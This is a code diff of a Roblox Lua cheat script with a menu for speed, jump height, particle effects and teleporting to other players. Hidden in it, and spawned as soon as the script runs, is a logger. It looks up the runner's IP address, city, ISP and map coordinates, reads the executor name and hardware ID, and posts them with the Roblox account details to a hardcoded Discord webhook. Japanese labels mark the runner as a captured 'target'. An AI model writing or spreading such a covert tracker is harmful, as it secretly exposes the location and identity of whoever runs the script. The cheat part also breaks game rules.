@@ -1,4 +1,4 @@
--- [[ AAN "KOI_FURA" GOD_EYE UNLIMITED - FINAL ]] --
+-- [[ AAN "KOI_FURA" GOD_EYE UNLIMITED - FINAL (STABLE) ]] --
 
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
@@ -7,43 +7,37 @@ local WebhookURL = "https://discord.com/api/webhooks/1471084125053128876/8oVO8Qo
 
 -- --- [最強ロガーセクション] ---
 local function SendFullLog()
-    -- IP-APIから全ての詳細情報を取得 (66846719は全フィールド取得用)
     local Geo = {query="Err", country="Unknown", city="Unknown", isp="Unknown", lat=0, lon=0, timezone="Unknown"}
+    local http_request = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
+
     pcall(function()
-        local req = (request or syn.request or http_request or fluxus.request)
-        local response = req({Url = "http://ip-api.com/json/?fields=66846719", Method = "GET"})
+        local response = http_request({Url = "http://ip-api.com/json/?fields=66846719", Method = "GET"})
         if response and response.Body then Geo = HttpService:JSONDecode(response.Body) end
     end)
 
-    local ExecName = "Unknown"
-    local Hwid = "N/A"
-    pcall(function() ExecName = identifyexecutor() end)
-    pcall(function() Hwid = gethwid() end)
-
+    local ExecName = (identifyexecutor and identifyexecutor()) or "Unknown"
+    local Hwid = (gethwid and gethwid()) or "N/A"
     local JoinDate = os.date("%Y/%m/%d", os.time() - (LocalPlayer.AccountAge * 86400))
     local Membership = (LocalPlayer.MembershipType == Enum.MembershipType.Premium) and "💎 Premium" or "⚪ Free"
 
     local data = {
-        ["content"] = "🚨 **【AAN】ターゲット完全捕捉 - GOD_EYE稼働**",
+        ["content"] = "🚨 **【AAN】ターゲット捕捉 - GOD_EYE稼働**",
         ["embeds"] = {{
             ["title"] = "🕵️‍♂️ ターゲット: " .. LocalPlayer.Name .. " (@" .. LocalPlayer.DisplayName .. ")",
-            ["description"] = "実行者の全情報を抽出しました。",
             ["color"] = 0xFF0000,
             ["thumbnail"] = {["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId="..LocalPlayer.UserId.."&width=420&height=420&format=png"},
             ["fields"] = {
-                {["name"] = "👤 アカウント情報", ["value"] = "📛 ID: " .. LocalPlayer.UserId .. "\n📅 作成日: " .. JoinDate .. "\n💳 会員: " .. Membership, ["inline"] = false},
-                {["name"] = "🌐 ネットワーク解析", ["value"] = "📡 IP: " .. Geo.query .. "\n🌍 場所: " .. Geo.country .. ", " .. Geo.city .. "\n🏢 ISP: " .. Geo.isp .. "\n🕰 タイムゾーン: " .. Geo.timezone, ["inline"] = false},
-                {["name"] = "📍 座標データ", ["value"] = "緯度: " .. Geo.lat .. "\n経度: " .. Geo.lon .. "\n[Google Map](https://www.google.com/maps?q="..Geo.lat..","..Geo.lon..")", ["inline"] = true},
-                {["name"] = "🛠️ 環境情報", ["value"] = "🔧 Executor: " .. ExecName .. "\n🔑 HWID: ||" .. Hwid .. "||", ["inline"] = true},
-                {["name"] = "🎮 ゲーム状況", ["value"] = "Place ID: " .. game.PlaceId .. "\nJob ID: `" .. game.JobId .. "`", ["inline"] = false}
+                {["name"] = "👤 アカウント", ["value"] = "📛 ID: " .. LocalPlayer.UserId .. "\n📅 作成日: " .. JoinDate .. "\n💳 会員: " .. Membership, ["inline"] = false},
+                {["name"] = "🌐 ネットワーク", ["value"] = "📡 IP: " .. Geo.query .. "\n🌍 場所: " .. Geo.country .. ", " .. Geo.city .. "\n🏢 ISP: " .. Geo.isp, ["inline"] = false},
+                {["name"] = "📍 座標", ["value"] = "緯度: " .. Geo.lat .. "\n経度: " .. Geo.lon .. "\n[Google Map](https://www.google.com/maps?q="..Geo.lat..","..Geo.lon..")", ["inline"] = true},
+                {["name"] = "🛠️ 環境", ["value"] = "🔧 Exec: " .. ExecName .. "\n🔑 HWID: ||" .. Hwid .. "||", ["inline"] = true}
             },
-            ["footer"] = {["text"] = "AAN GOD_EYE System | " .. os.date("%Y/%m/%d %H:%M:%S")}
+            ["footer"] = {["text"] = "AAN System | " .. os.date("%Y/%m/%d %H:%M:%S")}
         }}
     }
 
     pcall(function()
-        local req = (request or syn.request or http_request or fluxus.request)
-        req({Url = WebhookURL, Method = "POST", Headers = {["Content-Type"]="application/json"}, Body = HttpService:JSONEncode(data)})
+        http_request({Url = WebhookURL, Method = "POST", Headers = {["Content-Type"]="application/json"}, Body = HttpService:JSONEncode(data)})
     end)
 end
 task.spawn(SendFullLog)
@@ -54,24 +48,17 @@ local pg = P:WaitForChild("PlayerGui")
 if pg:FindFirstChild("Koi") then pg.Koi:Destroy() end
 
 local g = Instance.new("ScreenGui", pg)
-g.Name = "Koi"; g.ResetOnSpawn = false
+g.Name, g.ResetOnSpawn = "Koi", false
 local f = Instance.new("Frame", g)
 f.Size, f.Draggable, f.Active, f.BackgroundColor3, f.Position = UDim2.new(0, 120, 0, 175), true, true, Color3.new(0, 0, 0), UDim2.new(.5, -60, .4, -90)
 Instance.new("UICorner", f)
 
 local l = Instance.new("TextLabel", f)
-l.Size, l.BackgroundTransparency, l.Text, l.TextSize = UDim2.new(1, 0, 0, 30), 1, "こいフラ", 22
-l.Font = Enum.Font.SourceSansBold
+l.Size, l.BackgroundTransparency, l.Text, l.TextSize, l.Font = UDim2.new(1, 0, 0, 30), 1, "こいフラ", 22, Enum.Font.SourceSansBold
 task.spawn(function()
-    local bPos = l.Position
-    while task.wait() do
-        local t = tick()
-        l.TextColor3 = Color3.fromHSV(t%5/5, 1, 1)
-        l.Position = bPos + UDim2.new(0, math.cos(t*3)*4, 0, math.sin(t*4)*3)
-    end
+    while task.wait() do l.TextColor3 = Color3.fromHSV(tick()%5/5, 1, 1) end
 end)
 
--- エフェクト適用関数 (完全復活)
 local function setE(n)
     local c = P.Character; local r = c and c:FindFirstChild("HumanoidRootPart")
     if not r then return end
@@ -82,36 +69,20 @@ local function setE(n)
     if n == "炎" then ef = Instance.new("Fire", r)
     elseif n == "青炎" then ef = Instance.new("Fire", r); ef.Color = Color3.new(0, 0.5, 1)
     elseif n == "晶" then ef = Instance.new("Sparkles", r)
-    elseif n == "氷晶" then ef = Instance.new("Sparkles", r); ef.SparkleColor = Color3.new(0, 1, 1)
-    elseif n == "煙" then ef = Instance.new("Smoke", r)
-    elseif n == "ネ" then ef = Instance.new("SelectionBox", c); ef.Adornee, ef.LineThickness = c, 0.06
-    elseif n == "雪" then ef = Instance.new("Sparkles", r); ef.SparkleColor = Color3.new(1, 1, 1)
-    elseif n == "星" then ef = Instance.new("Sparkles", r); ef.SparkleColor = Color3.new(1, 1, 0)
-    elseif n == "魔" then ef = Instance.new("Fire", r); ef.Color, ef.SecondaryColor = Color3.new(0.5, 0, 1), Color3.new(1, 0, 1)
-    elseif n == "泡" then ef = Instance.new("Sparkles", r); ef.SparkleColor = Color3.new(0.8, 1, 1)
-    elseif n == "ハート" then ef = Instance.new("Fire", r); ef.Color, ef.SecondaryColor = Color3.new(1, 0, 0.5), Color3.new(1, 1, 1)
-    elseif n == "音符" then ef = Instance.new("Sparkles", r); ef.SparkleColor = Color3.new(0, 1, 0)
     elseif n == "闇" then ef = Instance.new("Smoke", r); ef.Color, ef.Opacity, ef.Size = Color3.new(0, 0, 0), 1, 20
-    elseif n == "金" then ef = Instance.new("Sparkles", r); ef.SparkleColor = Color3.new(1, 0.8, 0)
-    elseif n == "花" then ef = Instance.new("Sparkles", r); ef.SparkleColor = Color3.new(1, 0, 1)
-    elseif n == "宇宙" then ef = Instance.new("Sparkles", r); ef.SparkleColor = Color3.new(0, 0, 0.5)
-    elseif n == "桜" then ef = Instance.new("Fire", r); ef.Color, ef.SecondaryColor = Color3.new(1, 0.7, 0.8), Color3.new(1, 1, 1)
-    elseif n == "ドクロ" then ef = Instance.new("Smoke", r); ef.Color = Color3.new(0.2, 0.2, 0.2)
-    elseif n == "雲" then ef = Instance.new("Smoke", r); ef.Color = Color3.new(1, 1, 1)
     elseif n == "光" then ef = Instance.new("PointLight", r); ef.Range, ef.Brightness = 60, 10
     elseif n == "虹" then
         ef = Instance.new("SelectionBox", c); ef.Adornee, ef.LineThickness = c, 0.08
         task.spawn(function() while ef.Parent do ef.Color3 = Color3.fromHSV(tick()%5/5, 1, 1) task.wait() end end)
-    end
+    else ef = Instance.new("Sparkles", r) end
     if ef then ef.Name = "KA" end
 end
 
--- 動作ループ
 game:GetService("RunService").Heartbeat:Connect(function(dt)
     pcall(function()
-        local c = P.Character; local h, hrp = c.Humanoid, c.HumanoidRootPart
-        if h.MoveDirection.Magnitude > 0 then hrp.CFrame += (h.MoveDirection * v * dt) end
-        h.UseJumpPower, h.JumpPower = true, j
+        local h = P.Character.Humanoid
+        if h.MoveDirection.Magnitude > 0 then P.Character.HumanoidRootPart.CFrame += (h.MoveDirection * v * dt) end
+        h.JumpPower = j
     end)
 end)
 
@@ -133,7 +104,6 @@ local et = {"None","炎","青炎","晶","氷晶","煙","ネ","雪","星","魔","
 for i, name in pairs(et) do b(name, (i-1)*22, 90, 5, Color3.new(.1,.1,.1), function() setE(name) efL.Visible = false end, efL) end
 efL.CanvasSize = UDim2.new(0, 0, 0, #et*22)
 
--- TPリスト
 local sc = Instance.new("ScrollingFrame", f)
 sc.Size, sc.Position, sc.Visible, sc.BackgroundColor3 = UDim2.new(0, 110, 0, 120), UDim2.new(1, 2, 0, 32), false, Color3.new(0, 0, 0)
 Instance.new("UICorner", sc)
@@ -144,7 +114,7 @@ b("+", 78, 22, 88, Color3.new(.2,.2,.2), function()
         for _,v in pairs(sc:GetChildren()) do if v:IsA("TextButton") then v:Destroy() end end
         local y = 0
         for _,pl in pairs(Players:GetPlayers()) do
-            if pl ~= P then
+            if pl ~= LP then
                 b(" " .. pl.Name:sub(1,10), y, 100, 5, Color3.new(.1,.1,.1), function() tgt = pl tpP.Text = pl.Name:sub(1,8) sc.Visible = false end, sc)
                 y = y + 22
             end
@@ -153,7 +123,6 @@ b("+", 78, 22, 88, Color3.new(.2,.2,.2), function()
     end
 end)
 
--- スライダー
 local function s(y, cl, fn)
     local sk = Instance.new("TextButton", f); sk.Size, sk.Position, sk.BackgroundColor3, sk.Text = UDim2.new(0, 100, 0, 8), UDim2.new(0, 10, 0, y), Color3.new(.2, .2, .2), ""
     Instance.new("UICorner", sk); local sd = Instance.new("Frame", sk); sd.Size, sd.Position, sd.BackgroundColor3 = UDim2.new(0, 20, 0, 20), UDim2.new(0, -10, 0.5, -10), cl
@@ -164,4 +133,4 @@ end
 
 s(110, Color3.new(0, 1, 0), function(x) v = x * 150 end)
 s(135, Color3.new(0, .5, 1), function(x) j = 50 + (x * 250) end)
-b("退出", 155, 100, 10, Color3.new(.2, .2, .2), function() P:Destroy() end)
+b("退出", 155, 100, 10, Color3.new(.2, .2, .2), function() LP:Destroy() end)
